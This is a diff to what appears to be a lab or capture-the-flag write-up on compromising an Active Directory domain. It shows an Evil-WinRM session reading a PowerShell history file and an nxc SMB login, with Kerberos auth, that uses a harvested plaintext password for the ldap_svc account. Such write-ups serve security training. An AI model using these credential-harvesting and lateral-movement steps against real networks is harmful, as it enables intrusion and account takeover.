@@ -533,7 +533,7 @@ Info: Establishing connection to remote endpoint
 ```
 I am now Administrator on the CA server
 
-# Powershell history leads to user compromise
+# Powershell history leads to user compromise of `ldap_svc`
 ```python
 *Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine> type ConsoleHost_history.txt
 $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
@@ -564,3 +564,9 @@ SMB         10.10.10.136    445    DC               [-] ext.darkhaven.local\ldap
 ```
 So if i set a timeout i get an account restriction error, to get around this i can use kerberos auth
 
+```python
+nxc smb dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' -k              
+SMB         dc.ext.darkhaven.local 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
+SMB         dc.ext.darkhaven.local 445    DC               [+] ext.darkhaven.local\ldap_svc:6trfgvb**hs#@jskKFHJAh34 (Pwn3d!)
+```
+Using kerberos auth i see the user is compromised
